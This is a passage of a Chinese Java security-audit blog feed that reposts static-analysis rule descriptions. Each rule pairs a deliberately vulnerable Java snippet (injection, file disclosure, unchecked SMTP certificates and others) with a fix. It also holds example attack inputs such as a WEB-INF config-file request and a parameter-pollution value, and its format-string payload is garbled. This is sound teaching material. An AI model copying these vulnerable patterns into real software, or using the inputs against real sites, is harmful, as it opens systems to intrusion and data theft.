title="使用持久性的cookie"></a>使用持久性的cookie</h1><p>漏洞特征：COOKIE_PERSISTENT<br>将敏感数据存储在持久性的cookie中会危害到数据的保密性和账户的安全性<br>解释：<br>如果隐私信息被存储在持久性的cookie中，攻击者就会利用这个巨大的时间窗口来窃取数据，尤其持久性cookie会在用户的电脑中保存非常长的一段时间。持久性cookie一般是以文本的形式存储在客户端，攻击者可以同年哥哥访问受害者的机器来获取到这些信息。<br>持久性cookie会被经常使用，目的是为了在用户和网站互动时能够分析用户的行为。依靠持久性cookie去追踪数据，这可能已经侵犯了用户的隐私<br>有漏洞的代码：下面的代码可以让cookie保存一年</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[...]</span><br><span class="line">Cookie cookie = new Cookie(&quot;email&quot;, email);</span><br><span class="line">cookie.setMaxAge(60*60*24*365);</span><br><span class="line">[...]</span><br></pre></td></tr></table></figure><p>解决方案:</p><ul><li>在有必要的时候使用持久性cookie，并且要限制最大过期时间</li><li>不要在敏感上使用持久性cookie</li></ul><p>引用：<br><a href="https://tomcat.apache.org/tomcat-5.5-doc/servletapi/javax/servlet/http/Cookie.html#setMaxAge(int)" target="_blank" rel="noopener">Class Cookie setMaxAge documentation</a><br><a href="https://cwe.mitre.org/data/definitions/539.html" target="_blank" rel="noopener">CWE-539: Information Exposure Through Persistent Cookies</a></p><h1 id="url重写方法"><a href="#url重写方法" class="headerlink" title="url重写方法"></a>url重写方法</h1><p>漏洞规则：URL_REWRITING<br>该方法的实现包括确定是否需要在URL中编码session ID的逻辑。<br>url重写已经是非常严重的安全问题了，因为session ID 出现在url中，这就很容易被第三方获取到。在url中的session ID会以很多种的方式被暴露。</p><ul><li>日志</li><li>浏览器历史</li><li>复制粘贴到邮件中或者文章中</li><li>http的Referrer头中</li></ul><p>有漏洞的代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">out.println(&quot;Click &lt;a href=&quot; + </span><br><span class="line">                res.encodeURL(HttpUtils.getRequestURL(req).toString()) + </span><br><span class="line">                &quot;&gt;here&lt;/a&gt;&quot;);</span><br><span class="line">123</span><br></pre></td></tr></table></figure><p>解决方案：<br>避免使用这些方法，如果您要编码URL字符串或表单参数，请不要将URL重写方法与URLEncoder类混淆。<br>引用：<br>[OWASP Top 10 2010-A3-Broken Authentication and Session Management](OWASP Top 10 2010-A3-Broken Authentication and Session Management)</p><h1 id="不安全的SMTP-SSL链接"><a href="#不安全的SMTP-SSL链接" class="headerlink" title="不安全的SMTP SSL链接"></a>不安全的SMTP SSL链接</h1><p>漏洞特征：INSECURE_SMTP_SSL<br>当进行ssl连接时，服务器会禁用身份验证。一些启用ssl连接的邮件库默认情况下不会验证服务器的证书。这就等于信任所有的证书。当试图去连接服务器的时候，应用会很乐意的接收由”<a href="http://hackedserver.com/" target="_blank" rel="noopener">hackedserver.com</a>“签发的证书。当应用连接到黑客的邮件服务器时会有泄露用户敏感信息的风险。<br>有漏洞的代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">Email email = new SimpleEmail();</span><br><span class="line">email.setHostName(&quot;smtp.servermail.com&quot;);</span><br><span class="line">email.setSmtpPort(465);</span><br><span class="line">email.setAuthenticator(new DefaultAuthenticator(username, password));</span><br><span class="line">email.setSSLOnConnect(true);</span><br><span class="line">email.setFrom(&quot;user@gmail.com&quot;);</span><br><span class="line">email.setSubject(&quot;TestMail&quot;);</span><br><span class="line">email.setMsg(&quot;This is a test mail ... :-)&quot;);</span><br><span class="line">email.addTo(&quot;foo@bar.com&quot;);</span><br><span class="line">email.send();</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>解决方案：<br>请添加验证服务器证书的模块</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">email.setSSLCheckServerIdentity(true);</span><br></pre></td></tr></table></figure><p>引用：<br><a href="https://cwe.mitre.org/data/definitions/297.html" target="_blank" rel="noopener">CWE-297: Improper Validation of Certificate with Host Mismatch</a></p><h1 id="AWS查询注入"><a href="#AWS查询注入" class="headerlink" title="AWS查询注入"></a>AWS查询注入</h1><p>漏洞特征：AWS_QUERY_INJECTION<br>如果SimpleDB数据库查询字符串中包含用户输入的话就会让攻击者查看未授权的记录。<br>下面这个例子就是动态的创建查询字符串并且执行SimpleDB的select()查询，这个查询中允许用户指定productCategory。攻击者可以修改查询，绕过customerID的身份验证从而查看所有消费者的记录。<br>有漏洞的代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">String customerID = getAuthenticatedCustomerID(customerName, customerCredentials);</span><br><span class="line">String productCategory = request.getParameter(&quot;productCategory&quot;);</span><br><span class="line">...</span><br><span class="line">AmazonSimpleDBClient sdbc = new AmazonSimpleDBClient(appAWSCredentials);</span><br><span class="line">String query = &quot;select * from invoices where productCategory = &apos;&quot;</span><br><span class="line">            + productCategory + &quot;&apos; and customerID = &apos;&quot;</span><br><span class="line">            + customerID + &quot;&apos; order by &apos;&quot;</span><br><span class="line">            + sortColumn + &quot;&apos; asc&quot;;</span><br><span class="line">SelectResult sdbResult = sdbc.select(new SelectRequest(query));</span><br></pre></td></tr></table></figure><p>解决方案：<br>这个问题类似于sql注入，在进入SimpleDB数据库查询语句的之前要过滤用户的输入<br>引用：<br><a href="https://cwe.mitre.org/data/definitions/943.html" target="_blank" rel="noopener">CWE-943: Improper Neutralization of Special Elements in Data Query Logic</a></p><h1 id="JavaBeans属性注入"><a href="#JavaBeans属性注入" class="headerlink" title="JavaBeans属性注入"></a>JavaBeans属性注入</h1><p>漏洞特征：BEAN_PROPERTY_INJECTION<br>攻击者可以设置任意bean的属性，这样会降低系统的完整性。Bean的population函数允许设置bean的属性或者嵌套属性。<br>攻击者会影响这个函数从而去访问特殊的bean属性，比如class。类加载器允许他去操控系统属性并且会有潜在的执行任意代码的可能性。<br>有漏洞的代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">MyBean bean = ...;</span><br><span class="line">HashMap map = new HashMap();</span><br><span class="line">Enumeration names = request.getParameterNames();</span><br><span class="line">while (names.hasMoreElements()) &#123;</span><br><span class="line">    String name = (String) names.nextElement();</span><br><span class="line">    map.put(name, request.getParameterValues(name));</span><br><span class="line">&#125;</span><br><span class="line">BeanUtils.populate(bean, map);</span><br></pre></td></tr></table></figure><p>解决方案：<br>避免使用用户能够控制的数据去设置Bean属性的名称</p><p>引用：<br><a href="https://cwe.mitre.org/data/definitions/15.html" target="_blank" rel="noopener">CWE-15: External Control of System or Configuration Setting</a></p><h1 id="Struts敏感文件暴露"><a href="#Struts敏感文件暴露" class="headerlink" title="Struts敏感文件暴露"></a>Struts敏感文件暴露</h1><p>漏洞特征：STRUTS_FILE_DISCLOSURE<br>用户通过输入去访问服务器端的任意路径，这样会允许攻击者下载服务器端的任意文件（包含应用的类文件或者jar文件），或者直接查看在保护目录下的文件。<br>攻击者可能会伪造请求去寻找服务器中敏感的文件。例如，请求”<a href="http://example.com/?returnURL=WEB-INF/applicationContext.xml&quot;，服务器就会展示出applicationContext.xml的内容。攻击者就能通过applicationContext.xml精确的定位其他配置文件的位置，并且下载这些配置文件，甚至是类文件或者jar文件。获取到敏感信息之后，攻击者就会进行其他类型的攻击了。" target="_blank" rel="noopener">http://example.com/?returnURL=WEB-INF/applicationContext.xml&quot;，服务器就会展示出applicationContext.xml的内容。攻击者就能通过applicationContext.xml精确的定位其他配置文件的位置，并且下载这些配置文件，甚至是类文件或者jar文件。获取到敏感信息之后，攻击者就会进行其他类型的攻击了。</a><br>有漏洞的代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">... </span><br><span class="line">String returnURL = request.getParameter(&quot;returnURL&quot;); </span><br><span class="line">Return new ActionForward(returnURL); </span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>解决方案：<br>避免把用户输入的数据放入路径查询字符串之中。</p><p>引用：<br><a href="https://cwe.mitre.org/data/definitions/552.html" target="_blank" rel="noopener">CWE-552: Files or Directories Accessible to External Parties</a></p><h1 id="Spring敏感文件暴露"><a href="#Spring敏感文件暴露" class="headerlink" title="Spring敏感文件暴露"></a>Spring敏感文件暴露</h1><p>漏洞特征：SPRING_FILE_DISCLOSURE<br>用户通过输入去访问服务器端的任意路径，这样会允许攻击者下载服务器端的任意文件（包含应用的类文件或者jar文件），或者直接查看在保护目录下的文件。<br>攻击者可能会伪造请求去寻找服务器中敏感的文件。例如，请求”<a href="http://example.com/?returnURL=WEB-INF/applicationContext.xml&quot;，服务器就会展示出applicationContext.xml的内容。攻击者就能通过applicationContext.xml精确的定位其他配置文件的位置，并且下载这些配置文件，甚至是类文件或者jar文件。获取到敏感信息之后，攻击者就会进行其他类型的攻击了。" target="_blank" rel="noopener">http://example.com/?returnURL=WEB-INF/applicationContext.xml&quot;，服务器就会展示出applicationContext.xml的内容。攻击者就能通过applicationContext.xml精确的定位其他配置文件的位置，并且下载这些配置文件，甚至是类文件或者jar文件。获取到敏感信息之后，攻击者就会进行其他类型的攻击了。</a><br>有漏洞的代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">... </span><br><span class="line">String returnURL = request.getParameter(&quot;returnURL&quot;);</span><br><span class="line">return new ModelAndView(returnURL); </span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>解决方案：<br>避免把用户输入的数据放入路径查询字符串之中。</p><p>引用：<br><a href="https://cwe.mitre.org/data/definitions/552.html" target="_blank" rel="noopener">CWE-552: Files or Directories Accessible to External Parties</a></p><h1 id="RequestDispatcher敏感文件暴露"><a href="#RequestDispatcher敏感文件暴露" class="headerlink" title="RequestDispatcher敏感文件暴露"></a>RequestDispatcher敏感文件暴露</h1><p>漏洞特征：REQUESTDISPATCHER_FILE_DISCLOSURE<br>用户通过输入去访问服务器端的任意路径，这样会允许攻击者下载服务器端的任意文件（包含应用的类文件或者jar文件），或者直接查看在保护目录下的文件。<br>攻击者可能会伪造请求去寻找服务器中敏感的文件。例如，请求<a href="http://example.com/?jspFile=…/applicationContext.xml%3F&quot;，服务器就会展示出applicationContext.xml的内容。攻击者就能通过applicationContext.xml精确的定位其他配置文件的位置，并且下载这些配置文件，甚至是类文件或者jar文件。获取到敏感信息之后，攻击者就会进行其他类型的攻击了。" target="_blank" rel="noopener">http://example.com/?jspFile=…/applicationContext.xml%3F&quot;，服务器就会展示出applicationContext.xml的内容。攻击者就能通过applicationContext.xml精确的定位其他配置文件的位置，并且下载这些配置文件，甚至是类文件或者jar文件。获取到敏感信息之后，攻击者就会进行其他类型的攻击了。</a><br>有漏洞的代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">String jspFile = request.getParameter(&quot;jspFile&quot;);</span><br><span class="line">request.getRequestDispatcher(&quot;/WEB-INF/jsps/&quot; + jspFile + &quot;.jsp&quot;).include(request, response);</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>解决方案：<br>避免把用户输入的数据放入路径查询字符串之中。</p><p>引用：<br><a href="https://cwe.mitre.org/data/definitions/552.html" target="_blank" rel="noopener">CWE-552: Files or Directories Accessible to External Parties</a></p><h1 id="格式化字符串操作"><a href="#格式化字符串操作" class="headerlink" title="格式化字符串操作"></a>格式化字符串操作</h1><p>漏洞特征：FORMAT_STRING_MANIPULATION<br>如果用户输入能够控制格式化字符串参数的话，那么攻击者这个漏洞让应用抛出异常或者泄露信息。<br>攻击者可能会改变格式化字符串的参数，比如可以让应用抛出错误。如果错误没有被捕获，那么应用就会崩溃。<br>此外，如果敏感信息保留在内存中的话，那么攻击者就会改变格式化字符串去泄露敏感数据。<br>下面这个示例代码是让用户指定一个浮点数来展示余额，实际上，用户输入任何东西都会让应用抛出异常从而导致显示失败。甚至，更有害的例子是，如果攻击者输入”2f %3ss %4<em>s</em>.2”，那么格式化字符串就会变成”The customer: %s %s has the balance %4.2f.2f %3.2<em>f</em>s %4$.2”。这就会导致在输出结果中显示敏感的账户ID。<br>有漏洞代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Formatter formatter = new Formatter(Locale.US);</span><br><span class="line">String format = &quot;The customer: %s %s has the balance %4$.&quot; + userInput + &quot;f&quot;;</span><br><span class="line">formatter.format(format, firstName, lastName, accountNo, balance);</span><br></pre></td></tr></table></figure><p>解决方案：<br>避免让用户输入控制格式化字符串参数<br>引用:<br><a href="http://cwe.mitre.org/data/definitions/134.html" target="_blank" rel="noopener">CWE-134: Use of Externally-Controlled Format String</a></p><h1 id="http参数被污染"><a href="#http参数被污染" class="headerlink" title="http参数被污染"></a>http参数被污染</h1><p>漏洞特征：HTTP_PARAMETER_POLLUTION<br>将未验证的用户输入直接拼接到url中，这会让攻击者操控请求参数的值。攻击者可能会操控已存在参数的值，注入新的参数或者利用非变量字典中的参数。http参数污染 (HPP) 攻击包含将已编码的查询字符串分隔符注入其他现有参数。如果应用没有过滤用户输入，那么恶意的用户就可以构造特殊的输入攻击服务器端或者客户端程序。<br>在下面的例子中，程序员可能没有考虑到攻击者会给参数lang输入en&amp;user_id=1，这可能会让他的用户id发生改变。<br>有漏洞代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">String lang = request.getParameter(&quot;lang&quot;);</span><br><span class="line">GetMethod get = new GetMethod(&quot;http://www.host.com&quot;);</span><br><span class="line">get.setQueryString(&quot;lang=&quot; + lang + &quot;&amp;user_id=&quot; + user_id);</span><br><span class="line">get.execute();</span><br></pre></td></tr></table></figure><p>解决方案：<br>在使用http参数之前过滤用户输入数据<br>引用：<br><a href="https://capec.mitre.org/data/definitions/460.html" target="_blank" rel="noopener">CAPEC-460: HTTP Parameter Pollution (HPP)</a></p><h1 id="通过报错泄露敏感信息"><a href="#通过报错泄露敏感信息" class="headerlink" title="通过报错泄露敏感信息"></a>通过报错泄露敏感信息</h1><p>漏洞特征：INFORMATION_EXPOSURE_THROUGH_AN_ERROR_MESSAGE<br>在用户看来敏感信息是非常有价值的（比如密码），或者它可能会对其他平台有用，更多的情况下，会引发非常致命的攻击。如果攻击失败，攻击者就会参考服务器提供的错误信息来做更针对性的攻击。比如，试图利用目录穿越漏洞(CWE-22)可能会显示出应用安装的绝对路径。反过来，这样就可以选择合适数量的”…”去跳转到目标文件上。攻击者使用的sql注入(CWE-89)可能在一开始的时候不会成功，但是错误信息可能会展示畸形的查询，这可能会暴露查询逻辑，甚至密码或者包含在数据库中的其他敏感信息<br>有漏洞的代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">try &#123;</span><br><span class="line">  out = httpResponse.getOutputStream()</span><br><span class="line">&#125; catch (Exception e) &#123;</span><br><span class="line">  e.printStackTrace(out);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>引用:<br><a href="https://cwe.mitre.org/data/definitions/209.html" target="_blank" rel="noopener">CWE-209: Information Exposure Through an Error Message</a></p><h1 id="SMTP-头部注入"><a href="#SMTP-头部注入" class="headerlink" title="SMTP 头部注入"></a>SMTP 头部注入</h1><p>漏洞特征：SMTP_HEADER_INJECTION<br>简单邮件传输协议 (SMTP) 是基于纯文本协议来投递邮件的。就像http，头部字段被new line 所分割。如果用户输入被放置到邮件的头部，那么应用应该删除或者替换掉new line字符串(CR / LF)。你应该使用安全的封装，比如 <a href="https://commons.apache.org/proper/commons-email/userguide.html" target="_blank" rel="noopener">Apache Common Email</a> 和<a href="http://www.simplejavamail.org/" target="_blank" rel="noopener">Simple Java Mail</a> ，这些库会过滤掉那些会导致头部注入的特殊字符。<br>有漏洞代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Message message = new MimeMessage(session);</span><br><span class="line">message.setFrom(new InternetAddress(&quot;noreply@your-organisation.com&quot;));</span><br><span class="line">message.setRecipients(Message.RecipientType.TO, new InternetAddress[] &#123;new InternetAddress(&quot;target@gmail.com&quot;)&#125;);</span><br><span class="line">message.setSubject(usernameDisplay + &quot; has sent you notification&quot;); //Injectable API</span><br><span class="line">message.setText(&quot;Visit your ACME Corp profile for more info.&quot;);</span><br><span class="line">Transport.send(message);</span><br></pre></td></tr></table></figure><p>解决方案：<br>使用<a href="https://commons.apache.org/proper/commons-email/userguide.html" target="_blank" rel="noopener">Apache Common Email</a> 或<a href="http://www.simplejavamail.org/" target="_blank" rel="noopener">Simple Java Mail</a></p><p>引用：<br><a href="https://www.owasp.org/index.php/Testing_for_IMAP/SMTP_Injection_(OTG-INPVAL-011)" target="_blank" rel="noopener">OWASP SMTP Injection</a><br><a href="https://cwe.mitre.org/data/definitions/93.html" target="_blank" rel="noopener">CWE-93: Improper Neutralization of CRLF Sequences (‘CRLF Injection’)</a><br><a href="https://commons.apache.org/proper/commons-email/userguide.html" target="_blank" rel="noopener">Commons Email: User Guide</a><br><a href="http://www.simplejavamail.org/" target="_blank" rel="noopener">Simple Java Mail Website</a><br><a href="https://security.stackexchange.com/a/54100/24973" target="_blank" rel="noopener">StackExchange InfoSec: What threats come from CRLF in email generation?</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Java审计-DAY4&quot;&gt;&lt;a href=&quot;#Java审计-DAY4&quot; class=&quot;headerlink&quot; title=&quot;Java审计-DAY4&quot;&gt;&lt;/a&gt;Java审计-DAY4&lt;/h1&gt;&lt;p&gt;转载自 &lt;a href=&quot;https://blog.csdn.net
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://bai-ren-1.github.io/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>Java审计-DAY3</title>
    <link href="http://bai-ren-1.github.io/2020/03/02/Java%E5%AE%A1%E8%AE%A1-DAY3/"/>
    <id>http://bai-ren-1.github.io/2020/03/02/Java%E5%AE%A1%E8%AE%A1-DAY3/</id>
    <published>2020-03-02T06:56:56.000Z</published>
    <updated>2020-03-03T03:46:29.899Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Java审计-DAY3"><a href="#Java审计-DAY3" class="headerlink" title="Java审计-DAY3"></a>Java审计-DAY3</h1><p>转载自 <a href="https://blog.csdn.net/niexinming/article/details/84455035" target="_blank" rel="noopener">https://blog.csdn.net/niexinming/article/details/84455035</a> </p><h1 id="在使用脚本引擎时潜在的代码注入"><a href="#在使用脚本引擎时潜在的代码注入" class="headerlink" title="在使用脚本引擎时潜在的代码注入"></a>在使用脚本引擎时潜在的代码注入</h1><p>漏洞特征：SCRIPT_ENGINE_INJECTION<br>请严格的评估动态代码。应该仔细分析代码的结构。恶意代码的执行会导致数据的泄露或者执行任意系统指令。<br>如果你想动态的运行代码，那么请找一个沙箱（见引用）<br>有害的代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">public void runCustomTrigger(String script) &#123;</span><br><span class="line">    ScriptEngineManager factory = new ScriptEngineManager();</span><br><span class="line">    ScriptEngine engine = factory.getEngineByName(&quot;JavaScript&quot;);</span><br><span class="line"></span><br><span class="line">    engine.eval(script); //Bad things can happen here.</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>解决方案：<br>使用“Cloudbees Rhino Sandbox”库就能安全的评估Javascript代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">public void runCustomTrigger(String script) &#123;</span><br><span class="line">    SandboxContextFactory contextFactory = new SandboxContextFactory();</span><br><span class="line">    Context context = contextFactory.makeContext();</span><br><span class="line">    contextFactory.enterContext(context);</span><br><span class="line">    try &#123;</span><br><span class="line">        ScriptableObject prototype = context.initStandardObjects();</span><br><span class="line">        prototype.setParentScope(null);</span><br><span class="line">        Scriptable scope = context.newObject(prototype);</span><br><span class="line">        scope.setPrototype(prototype);</span><br><span class="line"></span><br><span class="line">        context.evaluateString(scope,script, null, -1, null);</span><br><span class="line">    &#125; finally &#123;</span><br><span class="line">        context.exit();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>引用：<br><a href="https://github.com/cloudbees/rhino-sandbox" target="_blank" rel="noopener">Cloudbees Rhino Sandbox: Utility to create sandbox with Rhino (block access to all classes)</a><br><a href="http://codeutopia.net/blog/2009/01/02/sandboxing-rhino-in-java/" target="_blank" rel="noopener">CodeUtopia.net: Sandboxing Rhino in Java</a><br><a href="http://blog.h3xstream.com/2014/11/remote-code-execution-by-design.html" target="_blank" rel="noopener">Remote Code Execution … by design</a>：里面有一些恶意代码的例子。这些例子能测试沙箱的规则<br><a href="http://cwe.mitre.org/data/definitions/94.html" target="_blank" rel="noopener">CWE-94: Improper Control of Generation of Code (‘Code Injection’)</a><br><a href="https://cwe.mitre.org/data/definitions/95.html" target="_blank" rel="noopener">CWE-95: Improper Neutralization of Directives in Dynamically Evaluated Code (‘Eval Injection’)</a></p><h1 id="使用Spring表达式时潜在的代码注入-SpEL表达式注入）"><a href="#使用Spring表达式时潜在的代码注入-SpEL表达式注入）" class="headerlink" title="使用Spring表达式时潜在的代码注入(SpEL表达式注入）"></a>使用Spring表达式时潜在的代码注入(SpEL表达式注入）</h1><p>漏洞规则：SPEL_INJECTION<br>Spring表达式被用来构建动态的值。源数据应该被严格的检验，以避免未过滤的时候进入到表达式的执行器中<br>有漏洞的代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">public void parseExpressionInterface(Person personObj,String property) &#123;</span><br><span class="line"></span><br><span class="line">        ExpressionParser parser = new SpelExpressionParser();</span><br><span class="line"></span><br><span class="line">        //Unsafe if the input is control by the user..</span><br><span class="line">        Expression exp = parser.parseExpression(property+&quot; == &apos;Albert&apos;&quot;);</span><br><span class="line"></span><br><span class="line">        StandardEvaluationContext testContext = new StandardEvaluationContext(personObj);</span><br><span class="line">        boolean result = exp.getValue(testContext, Boolean.class);</span><br><span class="line">[...]</span><br></pre></td></tr></table></figure><p>引用：<br><a href="http://cwe.mitre.org/data/definitions/94.html" target="_blank" rel="noopener">CWE-94: Improper Control of Generation of Code (‘Code Injection’)</a><br><a href="http://cwe.mitre.org/data/definitions/95.html" target="_blank" rel="noopener">CWE-95: Improper Neutralization of Directives in Dynamically Evaluated Code (‘Eval Injection’)</a><br><a href="http://docs.spring.io/spring-framework/docs/3.2.x/spring-framework-reference/html/expressions.html" target="_blank" rel="noopener">Spring Expression Language (SpEL) - Official Documentation</a><br><a href="https://www.mindedsecurity.com/fileshare/ExpressionLanguageInjection.pdf" target="_blank" rel="noopener">Minded Security: Expression Language Injection</a><br><a href="http://blog.h3xstream.com/2014/11/remote-code-execution-by-design.html" target="_blank" rel="noopener">Remote Code Execution … by design</a>: 里面有一些恶意代码的例子。这些例子能测试沙箱的规则.<br><a href="https://gosecure.net/2018/05/15/beware-of-the-magic-spell-part-1-cve-2018-1273/" target="_blank" rel="noopener">Spring Data-Commons: (CVE-2018-1273)</a><br><a href="http://gosecure.net/2018/05/17/beware-of-the-magic-spell-part-2-cve-2018-1260/" target="_blank" rel="noopener">Spring OAuth2: CVE-2018-1260</a></p><h1 id="使用表达式语言时潜在的代码注入（EL）"><a href="#使用表达式语言时潜在的代码注入（EL）" class="headerlink" title="使用表达式语言时潜在的代码注入（EL）"></a>使用表达式语言时潜在的代码注入（EL）</h1><p>漏洞特征：EL_INJECTION</p><p>表达式语言被用来构建动态的值。源数据应该被严格的检验，以避免未过滤的时候进入到表达式的执行器中<br>有漏洞代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">public void evaluateExpression(String expression) &#123;</span><br><span class="line">    FacesContext context = FacesContext.getCurrentInstance();</span><br><span class="line">    ExpressionFactory expressionFactory = context.getApplication().getExpressionFactory();</span><br><span class="line">    ELContext elContext = context.getELContext();</span><br><span class="line">    ValueExpression vex = expressionFactory.createValueExpression(elContext, expression, String.class);</span><br><span class="line">    return (String) vex.getValue(elContext);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>引用：<br><a href="http://blog.mindedsecurity.com/2015/11/reliable-os-shell-with-el-expression.html" target="_blank" rel="noopener">Minded Security: Abusing EL for executing OS commands</a><br><a href="https://docs.oracle.com/javaee/6/tutorial/doc/gjddd.html" target="_blank" rel="noopener">The Java EE 6 Tutorial: Expression Language</a><br><a href="http://cwe.mitre.org/data/definitions/94.html" target="_blank" rel="noopener">CWE-94: Improper Control of Generation of Code (‘Code Injection’)</a><br><a href="http://cwe.mitre.org/data/definitions/95.html" target="_blank" rel="noopener">CWE-95: Improper Neutralization of Directives in Dynamically Evaluated Code (‘Eval Injection’)</a><br><a href="https://www.mindedsecurity.com/fileshare/ExpressionLanguageInjection.pdf" target="_blank" rel="noopener">Minded Security: Expression Language Injection</a><br><a href="http://danamodio.com/appsec/research/spring-remote-code-with-expression-language-injection/" target="_blank" rel="noopener">Dan Amodio’s blog: Remote Code with Expression Language Injection</a><br><a href="http://blog.h3xstream.com/2014/11/remote-code-execution-by-design.html" target="_blank" rel="noopener">Remote Code Execution … by design</a>: 里面有一些恶意代码的例子。这些例子能测试沙箱的规则.</p><h1 id="潜在于Seam-logging-call中的代码注入"><a href="#潜在于Seam-logging-call中的代码注入" class="headerlink" title="潜在于Seam logging call中的代码注入"></a>潜在于Seam logging call中的代码注入</h1><p>漏洞特征：SEAM_LOG_INJECTION<br>Seam Logging API支持表达式语言的解析，目的是引出bean的property到日志消息中去。源数据会利用表达式执行未期望的代码。<br>在这个代码片段里面，表达式语言被用来构建动态的值。源数据应该被严格的检验，以避免未过滤的时候进入到表达式的执行器中<br>有漏洞的代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">public void logUser(User user) &#123;</span><br><span class="line">    log.info(&quot;Current logged in user : &quot; + user.getUsername());</span><br><span class="line">    //...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>解决方案：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">public void logUser(User user) &#123;</span><br><span class="line">    log.info(&quot;Current logged in user : #0&quot;, user.getUsername());</span><br><span class="line">    //...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>引用：<br><a href="https://issues.jboss.org/browse/JBSEAM-5130" target="_blank" rel="noopener">JBSEAM-5130: Issue documenting the risk</a><br><a href="https://docs.jboss.org/seam/2.3.1.Final/reference/html_single/#d0e4185" target="_blank" rel="noopener">JBoss Seam: Logging (Official documentation)</a><br><a href="https://docs.oracle.com/javaee/6/tutorial/doc/gjddd.html" target="_blank" rel="noopener">The Java EE 6 Tutorial: Expression Language</a><br><a href="http://cwe.mitre.org/data/definitions/94.html" target="_blank" rel="noopener">CWE-94: Improper Control of Generation of Code (‘Code Injection’)</a><br><a href="http://cwe.mitre.org/data/definitions/95.html" target="_blank" rel="noopener">CWE-95: Improper Neutralization of Directives in Dynamically Evaluated Code (‘Eval Injection’)</a></p><h1 